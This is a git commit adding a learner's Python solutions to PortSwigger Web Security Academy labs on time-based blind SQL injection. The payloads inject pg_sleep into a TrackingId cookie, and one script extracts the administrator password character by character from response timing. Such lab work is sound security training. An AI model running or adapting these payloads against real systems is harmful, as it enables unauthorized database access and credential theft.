08cb77f61575aca00e5a09153692d0b2c6f2b21c
maiphuonghoang <maiphuonghoangmpk@gmail.com>
2023-06-02 07:08:31 +0700

    port swigger web-security sql injection lab 13, 14

--- SQL_Injection/Lab13/lab13.py
+++ SQL_Injection/Lab13/lab13.py
@@ -1,4 +1,40 @@
-
+# Blind SQL injection with time delays
 """
-
+    TrackingId = x ' || (SELECT sleep(10)) --'    -> X mySQL 
+    TrackingId = x ' || (SELECT pg_sleep(10)) --'  -> Postgres
 """
+import requests
+import sys
+import urllib3
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+import urllib
+
+proxies = {'http': 'http://127.0.0.1:8080','https': 'http://127.0.0.1:8080' }
+
+# url = 'https://0a8800a8044a76b684e00e2000a8004d.web-security-academy.net/'
+
+def blind_sqli_check(url):
+    sqli_payload = "' || (SELECT pg_sleep(10)) --"
+    sqli_payload_encoded = urllib.parse.quote(sqli_payload)
+    cookies = {
+        'TrackingId': 'qt5tXolxDkAmj8Nf' + sqli_payload_encoded,
+        'session': 'ulXeEn3knzIiT1091cBKg1XgH3cTsd9v' 
+    }
+    r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
+    if int(r.elapsed.total_seconds())  > 10:
+        print("(+) time %s Vulerable to blind-based sqli ", r.elapsed.total_seconds())
+    else:
+        print("(+) time %s Not vulerable to blind-based sqli ", r.elapsed.total_seconds())           
+
+def main(): 
+    if len(sys.argv) != 2:
+        print ("[-] Usage: %s <url> <payload>" % sys.argv[0])
+        print ('[-] Example: %s www.example.com "1=1"' % sys.argv[0])
+        sys.exit(-1)
+    url = sys.argv[1]
+    print("[+] Checking if checking cookie is vulnerable to time-based blind SQLi")
+    blind_sqli_check(url)
+    
+if __name__ == '__main__':
+    main()
+    
--- SQL_Injection/Lab14/lab14.py
+++ SQL_Injection/Lab14/lab14.py
@@ -1,20 +1,34 @@
-#Blind SQL injection with time delays
-
-#TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,2,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
+# Blind SQL injection with time delays and information retrieval
 """
+    1. Confirm that the parameter is vulnerable to SQLi
+    TrackingId=x' || pg_sleep(10) --
+    or: ' || (SELECT pg_sleep(10))--        bắt buộc phải có ngoặc 
 
+    2. Confirm that the users table exists in the database
+    ' || (SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(-1) END) --
+    ' || (SELECT CASE WHEN (1=0) THEN pg_sleep(10) ELSE pg_sleep(-1) END) --
+
+    ' || (SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(-1) END from users) --
+    or ' || (SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(-1) END from users WHERE username='administrator') --
+    or ' || (SELECT pg_sleep(10) from users WHERE username='administrator') --
+    
+    3. Enumerate the password length 
+    ' || (SELECT CASE WHEN (username='administrator' AND LENGTH(password)=20) THEN pg_sleep(10) ELSE pg_sleep(-1) END from users) --
+
+    ' || (SELECT CASE WHEN (username='administrator' AND SUBSTRING(password, 1, 1)= 'a') THEN pg_sleep(10) ELSE pg_sleep(-1) END from users) --
 """
 
 import requests
 import sys
 import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+import urllib
 
 proxies = {'http': 'http://127.0.0.1:8080','https': 'http://127.0.0.1:8080' }
 
 headers = {
-    'Host': '0a2b005d04913b5b82aa9cd7002b00cb.web-security-academy.net',
-    'Cookie': 'TrackingId=GXHt2MCQVa1USlZb; session=wmXWd97w4X9nn0Gn8AmHlgdVujHvTJbS',
+    'Host': '0a4e00d70451e4d081c26bbc00df00fc.web-security-academy.net',
+    'Cookie': 'TrackingId=EjapMRjt652mOVTu; session=pV9krZ2S58ZMcvPAZu6WDk44BeFPYUvP',
     'Sec-Ch-Ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
     'Sec-Ch-Ua-Mobile': '?0',
     'Sec-Ch-Ua-Platform': '"Linux"',
@@ -25,26 +39,43 @@ headers = {
     'Sec-Fetch-Mode': 'navigate',
     'Sec-Fetch-User': '?1',
     'Sec-Fetch-Dest': 'document',
-    'Referer': 'https://0a2b005d04913b5b82aa9cd7002b00cb.web-security-academy.net/login',
+    'Referer': 'https://0a4e00d70451e4d081c26bbc00df00fc.web-security-academy.net/',
     'Accept-Encoding': 'gzip, deflate',
     'Accept-Language': 'en-US,en;q=0.9'
 }
+#respone = requests.get(url, headers=headers, proxies=proxies, verify=False)
 
-def exploit_sqli(url, payload):  
-    cookie = headers['Cookie']
-    format_cookie = urllib.parse.quote_plus(cookie)
-    respone = requests.get(url, params=params, headers=headers, proxies=proxies)
+
+def sqli_password(url):  
+    password_extracted = ""
+    for i in range(1,21):
+        for j in range (32, 126):
+            sql_payload = "' || (SELECT CASE WHEN (username='administrator' AND ascii(SUBSTRING(password, %s, 1))= '%s') THEN pg_sleep(10) ELSE pg_sleep(-1) END from users) --"  % (i,j)
+            sql_payload_encoded = urllib.parse.quote(sql_payload)
+            cookies = {
+                'TrackingId': 'EjapMRjt652mOVTu' + sql_payload,
+                'session': 'pV9krZ2S58ZMcvPAZu6WDk44BeFPYUvP'
+            }
+            # dùng sql_payload hoặc sql_payload_encoded đều được 
+            r = requests.get(url, cookies=cookies, proxies=proxies, verify=False)
+            if(int(r.elapsed.total_seconds()) > 9):
+                password_extracted += chr(j)
+                sys.stdout.write('\r'+ password_extracted)
+                sys.stdout.flush()
+                break
+            else:
+                sys.stdout.write('\r'+ password_extracted + chr(j))
+                sys.stdout.flush()                            
     
-if __name__ == '__main__':
-    try:
-        url = sys.argv[1].strip()
-        payload = sys.argv[2].strip()
-    except IndexError:
+def main(): 
+    if len(sys.argv) != 2:
         print ("[-] Usage: %s <url> <payload>" % sys.argv[0])
         print ('[-] Example: %s www.example.com "1=1"' % sys.argv[0])
-
-if exploit_sqli(url, payload):
-    print("[+] SQL injection successfully")
-else:
-    print("[-] SQL injection failed")
+        sys.exit(-1)
+    url = sys.argv[1]
+    print("[+] Retreiving administrator password")
+    sqli_password(url)
+    
+if __name__ == '__main__':
+    main()
 
